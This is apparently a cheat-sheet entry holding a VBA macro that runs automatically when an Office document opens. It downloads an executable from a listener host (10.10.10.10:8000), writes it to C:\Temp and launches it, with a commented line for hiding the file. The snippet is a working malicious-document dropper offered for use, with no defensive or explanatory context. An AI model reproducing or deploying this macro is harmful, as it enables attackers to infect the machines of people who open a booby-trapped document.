# Downloading a EXE payload from VBA

```visual-basic

Private Sub Document_Open()
  Const ADTYPEBINARY = 1
    Const ADSAVECREATEOVERWRITE = 2
    
    Dim xHttp
    Dim bStrm
    Dim filename
    
    Set xHttp = CreateObject("Microsoft.XMLHTTP")
    xHttp.Open "GET", "http://10.10.10.10:8000/s81.exe", False
    xHttp.Send
    
    Set gobjBinaryOutputStream = CreateObject("Adodb.Stream")
    
    filename = "C:\Temp\" & DateDiff("s", #1/1/1970#, Now()) & ".exe"
    
    gobjBinaryOutputStream.Type = ADTYPEBINARY
    gobjBinaryOutputStream.Open
    gobjBinaryOutputStream.write xHttp.responseBody
    gobjBinaryOutputStream.savetofile filename, ADSAVECREATEOVERWRITE
    
    'SetAttr filename, vbReadOnly + vbHidden + vbSystem
    Shell filename, vbNormalFocus
End Sub

```
